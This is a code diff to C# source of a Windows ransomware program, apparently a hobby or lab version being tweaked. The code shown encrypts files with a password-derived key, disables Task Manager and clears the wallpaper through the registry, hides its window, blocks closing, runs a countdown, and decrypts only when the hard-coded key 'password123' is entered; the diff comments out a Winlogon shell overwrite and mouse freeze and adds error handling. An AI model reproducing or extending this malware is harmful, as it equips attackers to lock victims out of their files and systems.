@@ -17,6 +17,7 @@ namespace Ransomeware
         //For hide window
         private const int SW_HIDE = 0;
         private const int SW_SHOW = 5;
+        bool flag = false;
         [DllImport("User32")]
         private static extern int ShowWindow(int hwnd, int nCmdShow);
 
@@ -46,20 +47,20 @@ namespace Ransomeware
             //If you write correct key
             else if (codeBox.Text == "password123") 
             {
-
+                flag = true;
                 MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 //Enable taskmanager
                 RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
-                reg.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
+               reg.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
                 //Repair shell
-                RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
-                reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
+                //RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
+                //reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
 
                 OFF_Encrypt(); //decrypt all encrypt files
 
                 //kill ransomware
                 Process[] _process = null;
-                _process = Process.GetProcessesByName("Rasomware2.0");
+                _process = Process.GetProcessesByName("Rasomware");
                 foreach (Process proces in _process)
                 {
                     proces.Kill();
@@ -82,7 +83,7 @@ namespace Ransomeware
             Location = new Point(-100, -100);
 
             //Freeze mouse
-            FreezeMouse(); 
+           //FreezeMouse(); 
 
 
             //Disable taskmanager
@@ -90,12 +91,12 @@ namespace Ransomeware
             reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
 
             //Remove wallpaper
-            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
-            reg2.SetValue("Wallpaper", "", RegistryValueKind.String);
+           RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
+           reg2.SetValue("Wallpaper", "", RegistryValueKind.String);
 
             //If you shutdown your computer, you can't run winodws well
-            RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
-            reg3.SetValue("Shell", "empty", RegistryValueKind.String);
+           //RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
+            //reg3.SetValue("Shell", "empty", RegistryValueKind.String);
 
             //define for desktop path
             string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); 
@@ -132,9 +133,10 @@ namespace Ransomeware
             tmr_encrypt.Start();
 
             //If you see on window 00:00:00, system will kill
-            tmr_clock.Start(); 
+           tmr_clock.Start(); 
 
         }
+        
         private void tmr_hide_Tick(object sender, EventArgs e)
         {
             tmr_hide.Stop();
@@ -143,6 +145,7 @@ namespace Ransomeware
             Location = new Point(500, 500);
             //Anti freeze
             Thawouse(); 
+            
         }
 
         private void tmr_show_Tick(object sender, EventArgs e)
@@ -224,24 +227,31 @@ namespace Ransomeware
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-            e.Cancel = true; //for antikill
+            if(!flag)
+                e.Cancel = true; //for antikill
         }
 
         public class EncryptionFile
         {
             public void EncryptFile(string file, string password)
             {
+                try
+                {
+                    byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
+                    byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
 
-                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
-                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+                    // Hash the password with SHA256
+                    passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+                    byte[] bytesEncrypted = Cipher.Encrypt(bytesToBeEncrypted, passwordBytes, 16);
 
-                // Hash the password with SHA256
-                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
-                byte[] bytesEncrypted = Cipher.Encrypt(bytesToBeEncrypted,passwordBytes,128) ;
+                    string fileEncrypted = file;
 
-                string fileEncrypted = file;
-
-                File.WriteAllBytes(fileEncrypted, bytesEncrypted);
+                    File.WriteAllBytes(fileEncrypted, bytesEncrypted);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e.Message);
+                }
             }
         }
         //start encrypt files on desktop and download folder
@@ -304,15 +314,21 @@ namespace Ransomeware
         {
             public void DecryptFile(string fileEncrypted, string password)
             {
+                try
+                {
+                    byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
+                    byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+                    passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
 
-                byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
-                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
-                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+                    byte[] bytesDecrypted = Cipher.Decrypt(bytesToBeDecrypted, passwordBytes, 16);
 
-                byte[] bytesDecrypted = Cipher.Decrypt(bytesToBeDecrypted, passwordBytes, 128);
-
-                string file = fileEncrypted;
-                File.WriteAllBytes(file, bytesDecrypted);
+                    string file = fileEncrypted;
+                    File.WriteAllBytes(file, bytesDecrypted);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e.Message);
+                }
             }
         }
     }
